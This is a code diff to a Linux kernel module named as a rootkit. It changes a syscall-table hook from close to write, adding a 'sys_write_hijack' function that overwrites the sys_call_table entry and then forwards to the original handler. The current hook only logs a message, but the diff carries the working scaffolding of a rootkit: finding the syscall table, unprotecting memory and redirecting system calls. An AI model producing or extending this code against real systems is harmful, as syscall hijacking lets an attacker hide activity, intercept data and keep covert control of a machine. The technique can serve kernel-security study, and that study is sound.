@@ -7,8 +7,12 @@
 #include <linux/slab.h>
 #include <linux/version.h>
 #include <linux/kallsyms.h>
+#include <linux/fs.h>
+#include <linux/buffer_head.h>
 #include <asm/paravirt.h>
 #include <asm-generic/unistd.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
 
 static unsigned long *sys_call_table;
 static unsigned long orig_sys_call_table[__NR_syscalls] = { 0 };
@@ -59,13 +63,14 @@ static void unhook_all(void)
     protect_memory();
 }
 
-asmlinkage long sys_close_fake(unsigned int fd)
-{
-    long (*orig_close)(unsigned int) = (long (*)(unsigned int))(sys_call_table[__NR_close]);
+asmlinkage int sys_write_hijack(unsigned int fd, const char __user *buf, size_t count) 
+{ 
+    int (*orig_write)(unsigned int, const char __user *, size_t) = 
+        (int (*)(unsigned int, const char __user *, size_t))(sys_call_table[__NR_write]);
 
-    printk(KERN_EMERG "HOOKED!!!\n");
-    
-    return orig_close(fd);
+    printk(KERN_ALERT "WRITE HIJACKED\n");
+ 
+    return (*orig_write)(fd, buf, count);
 }
 
 static int __init init_rootkit(void)
@@ -76,7 +81,7 @@ static int __init init_rootkit(void)
     
     printk(KERN_INFO "sys_call_table address: %px\n", sys_call_table);
 
-    hook_syscall(__NR_close, (unsigned long)sys_close_fake);
+    hook_syscall(__NR_write, (unsigned long)sys_write_hijack);
 
     return 0;
 }
